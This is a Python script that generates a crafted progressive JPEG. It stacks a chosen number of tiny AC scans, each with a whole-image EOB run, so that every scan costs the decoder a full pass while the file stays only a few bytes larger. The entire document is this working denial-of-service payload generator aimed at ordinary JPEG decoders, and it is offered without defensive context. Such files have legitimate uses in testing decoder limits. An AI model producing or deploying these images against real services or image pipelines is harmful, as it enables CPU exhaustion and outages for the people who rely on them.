#!/usr/bin/env python3
"""Craft a minimal progressive JPEG whose scans each cost a full decode pass
but only ~16 bytes of file size (EOBRUN covers the whole image).

Usage: gen_manyscans.py <out.jpg> <width> <height> <num_extra_scans>
"""
import struct
import sys

out, w, h, n_extra = sys.argv[1], int(sys.argv[2]), int(sys.argv[3]), int(sys.argv[4])

W, H = int(sys.argv[2]), int(sys.argv[3])
mcus = ((W + 7) // 8) * ((H + 7) // 8)

buf = bytearray()
buf += b"\xff\xd8"  # SOI

# DQT table 0, all ones
buf += b"\xff\xdb" + struct.pack(">H", 2 + 1 + 64) + b"\x00" + b"\x01" * 64

# SOF2 (progressive), 8-bit, 1 component (grayscale), sampling 1x1, Q-table 0
sof = struct.pack(">BHHB", 8, H, W, 1) + struct.pack(">BBB", 1, 0x11, 0)
buf += b"\xff\xc2" + struct.pack(">H", 2 + len(sof)) + sof

# DHT DC table 0: one 1-bit code, symbol 0x00 (DC diff = 0)
dht_dc = b"\x00" + bytes([1] + [0] * 15) + b"\x00"
buf += b"\xff\xc4" + struct.pack(">H", 2 + len(dht_dc)) + dht_dc

# SOS: DC first scan (Ss=0, Se=0, Ah/Al=0), component 1 uses DC table 0
sos = struct.pack(">B", 1) + struct.pack(">BB", 1, 0x00) + struct.pack(">BBB", 0, 0, 0)
buf += b"\xff\xda" + struct.pack(">H", 2 + len(sos)) + sos
# entropy data: one '0' bit per MCU -> all DC diffs zero
nbytes = (mcus + 7) // 8
data = bytearray()
for i in range(nbytes):
    data.append(0x00)
buf += bytes(data)

# DHT AC table 0: one 1-bit code, symbol 0xE0 (EOB run, 14 extra bits)
dht_ac = b"\x10" + bytes([1] + [0] * 15) + b"\xE0"
buf += b"\xff\xc4" + struct.pack(">H", 2 + len(dht_ac)) + dht_ac

# Each extra scan: AC first scan Ss=1,Se=63,Ah=0,Al=0.
# Entropy data: groups of (1-bit code '0' + 14 bits) -> EOBRUN = 16384+16383 = 32767.
# Two groups cover up to 65534 MCUs; emit ceil(mcus/32767) groups.
sos_ac = struct.pack(">B", 1) + struct.pack(">BB", 1, 0x00) + struct.pack(">BBB", 1, 63, 0)
sos_ac = b"\xff\xda" + struct.pack(">H", 2 + len(sos_ac)) + sos_ac

groups = (mcus + 32766) // 32767
# bit pattern per group: '0' then 14 ones = 0b0011111111111111 (15 bits)
bits = "0" + "1" * 14
scan_bits = bits * groups
# pad to byte boundary with 1 bits (pad bits must be 1 per spec)
while len(scan_bits) % 8:
    scan_bits += "1"
scan_data = int(scan_bits, 2).to_bytes(len(scan_bits) // 8, "big")
# byte-stuff any 0xFF
stuffed = scan_data.replace(b"\xff", b"\xff\x00")

for i in range(n_extra):
    buf += sos_ac + stuffed

buf += b"\xff\xd9"  # EOI
open(out, "wb").write(bytes(buf))
print("%s: %dx%d, %d MCUs/scan, %d extra scans, %d bytes"
      % (out, W, H, mcus, n_extra, len(buf)))
